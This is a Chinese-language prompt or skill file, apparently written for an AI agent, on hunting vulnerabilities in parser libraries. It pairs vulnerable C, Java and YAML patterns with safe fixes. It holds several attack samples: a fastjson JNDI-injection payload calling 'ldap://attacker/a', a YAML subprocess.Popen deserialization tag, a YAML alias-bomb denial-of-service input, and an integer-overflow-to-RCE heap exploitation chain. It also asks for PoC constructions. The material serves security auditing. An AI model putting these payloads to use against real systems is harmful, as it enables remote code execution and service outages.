---
description: 解析器漏洞狩猎 - 专家在解析库源码中寻找漏洞的直觉流
tags: [data-parser, vuln-hunter, hunting, integer-overflow, deserialization, dos]
---

# 解析器漏洞狩猎 (Vuln Hunter): 在源码中寻找致命缺陷

> 你的任务不是读完整套源码，而是用漏洞模式做"模式匹配"。
> 看到特定代码结构，立刻触发追问链，在最短时间内定位可利用的缺陷。

---

## 触发器：什么代码结构让漏洞猎人立刻进入战斗状态？

### 触发器一：看到 `malloc(count * sizeof(T))`

**你的第一眼反应**："乘法溢出。如果 count 是用户控制的，16 * 0x100000000 = 16 字节。"

整数溢出是解析器漏洞的皇冠明珠。攻击者传入极大的元素数量，乘法在 32 位环境下回绕，分配极小的 buffer，后续循环向其中写入海量数据。

**立即追问链**：
1. count 和 sizeof 的类型分别是什么？是否有符号/无符号混用？
2. 乘法前是否做了溢出检查？例如 `if (count > SIZE_MAX / sizeof(T))`?
3. 如果分配失败返回 NULL，后续代码是否检查了返回值？
4. 元素数量是否来自长度字段的除法计算？如 `count = len / sizeof(T)`，此时 len 为 0 会怎样？
5. 是否存在 `realloc(ptr, old_size + new_size)` 导致的溢出？
6. 32 位与 64 位构建是否行为一致？攻击者是否能强制目标以 32 位模式运行？

### 触发器二：看到递归函数解析嵌套结构且无深度限制

**你的第一眼反应**："10KB 的 JSON 就能让解析器栈溢出或耗尽 CPU。"

`[[[[...]]]]` 或 XML 实体递归展开是经典攻击面。现代语言默认栈空间有限（8MB），C 语言中每帧若分配数组，深度上千即可触发段错误。

**立即追问链**：
1. 递归函数是否接受 `depth` 参数？上限值是多少？
2. 上限值是否可通过配置文件或 API 参数被攻击者调高？
3. 如果达到上限，是返回错误还是静默截断？截断是否会导致逻辑不一致？
4. 是否存在 alias/引用机制绕过深度检查？如 YAML `&a [*a]` 循环引用。
5. 解析器是否使用尾递归优化？非尾递归的每层栈帧大小是多少？
6. 除了栈溢出，深层嵌套是否会导致 O(N²) 的算法复杂度（如每次查找符号表）？

### 触发器三：看到外部数据决定反序列化类型

**你的第一眼反应**："这不是解析，这是远程类加载。"

fastjson `{"@type":"com.sun.rowset.JdbcRowSetImpl"}`、YAML `!!python/object:subprocess.Popen`——都是让攻击者指定类名的模式。

**立即追问链**：
1. 类型名称字符串是否经过任何过滤或白名单限制？
2. 白名单是否使用字符串前缀匹配？如 `com.company.*` 是否能被 `com.company.evil.Class` 绕过？
3. 反序列化流程是否会调用 setter、getter、构造函数、readObject？
4. 目标 Classpath 中是否存在已知 Gadget（如 JNDI、RMI、JDBC）？
5. 是否支持数组类型或内部类？这些路径是否绕过了普通类的检查？
6. 是否存在通过 Type Confusion（如把 Map 反序列化为自定义类）导致的内存损坏？

### 触发器四：看到编码转换函数（如 `iconv`、`MultiByteToWideChar`）

**你的第一眼反应**："输出缓冲区大小计算与编码层的实际输出字节数永远不一致。"

UTF-8 到 UTF-16 转换时，字节数可能翻倍。如果输出 buffer 按输入字节数分配，转换即溢出。

**立即追问链**：
1. 输出 buffer 的大小是基于输入字节数还是最大可能输出字节数？
2. 转换函数返回值（实际写入字节数）是否被用于后续长度计算？
3. 无效输入序列（如孤立代理对）是否会导致转换函数返回错误码？错误是否被忽略？
4. 是否存在 `\x00` 空字节在转换后被保留或截断，导致字符串长度判断错误？
5. 是否使用语言内置的 encoding API？这些 API 是否自动处理 BOM 和替换字符？
6. 编码层的长度是否与上层安全过滤器使用同一单位（字节 vs 字符）？

### 触发器五：看到零拷贝指针返回（如 `StringView`、`Slice`）

**你的第一眼反应**："这个指针什么时候变成悬垂指针？"

解析器返回指向内部 buffer 的视图，而非复制数据。一旦 buffer 被释放或复用，视图即指向无效内存。

**立即追问链**：
1. 视图对象的生命周期是否明确绑定了原 buffer？
2. 如果原 buffer 来自临时栈空间或固定大小的接收缓冲区，何时失效？
3. 业务代码是否将视图存入长期存在的容器中？
4. 是否存在多线程竞争：一个线程释放 buffer，另一个读取视图？
5. 解析器是否提供了显式的深拷贝方法？开发者是否误用了零拷贝方法？
6. 在垃圾回收语言中，视图是否阻止了原 buffer 的 GC？如果强制 GC 会怎样？

---

## 攻击链闭合：从源码缺陷到可利用漏洞

```
[源码中定位到 count * sizeof 乘法]
    → [确认 count 来自用户输入且无溢出检查]
    → [构造 count = 0x20000000, sizeof = 8 → 乘法回绕到 0]
    → [malloc(0) 或极小分配成功返回非 NULL]
    → [循环写入 0x20000000 个元素 → 堆彻底损坏]
    → [覆盖堆元数据或 tcache 指针 → 实现任意地址读写]
    → [RCE]
```

**闭合条件**：算术溢出可控 + 分配结果可用 + 写入循环不受阻。

---

## 典型代码模式与警觉点

### 脆弱模式：整数溢出分配
```c
// 脆弱：无溢出检查的元素数组分配
uint32_t n = read_u32(stream);
Item *items = malloc(n * sizeof(Item));  // ← n=0x40000000, sizeof=8 → 溢出为 0
for (uint32_t i = 0; i < n; i++) {
    items[i].field = read_u32(stream);    // → 向未分配内存疯狂写入
}
```

### 安全模式：前置溢出检查
```c
// 安全：显式检查乘法溢出
uint32_t n = read_u32(stream);
if (n > SIZE_MAX / sizeof(Item)) {
    return ERR_OVERFLOW;
}
Item *items = malloc(n * sizeof(Item));
if (!items) return ERR_NOMEM;
for (uint32_t i = 0; i < n; i++) {
    items[i].field = read_u32(stream);
}
```

### 脆弱模式：反序列化类型混淆
```java
// 脆弱：fastjson 风格自动类型
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
// 攻击者发送 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/a"}
// → 触发 JNDI 注入 → RCE
```

### 安全模式：严格类型白名单
```java
// 安全：只允许显式注册的类
ParserConfig config = new ParserConfig();
config.addAccept("com.myapp.safe.model.User");
config.addAccept("com.myapp.safe.model.Order");
// 拒绝一切其他类型，包括数组和内部类
```

### 脆弱模式：YAML 别名炸弹
```yaml
# 脆弱：允许无限别名展开
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
# ... 指数级膨胀 → 内存耗尽
```

### 安全模式：别名限制
```python
# 安全：PyYAML 正确配置
yaml.safe_load(stream)  # 禁止 !!python/object 等危险标签
# 或显式设置 resolver=Resolver(base_resolver) 并限制 alias 数量
```

---

## 输出要求

1. **漏洞模式清单**：按触发器分类的代码特征与缺陷位置。
2. **可利用性评估**：每个发现的缺陷是理论问题还是实际可利用（考虑 ASLR、NX、堆布局）。
3. **PoC 思路**：针对每个高危缺陷，写出最简输入构造思路。
4. **变种可能性**：该缺陷是否存在于同系列解析器的其他版本中。
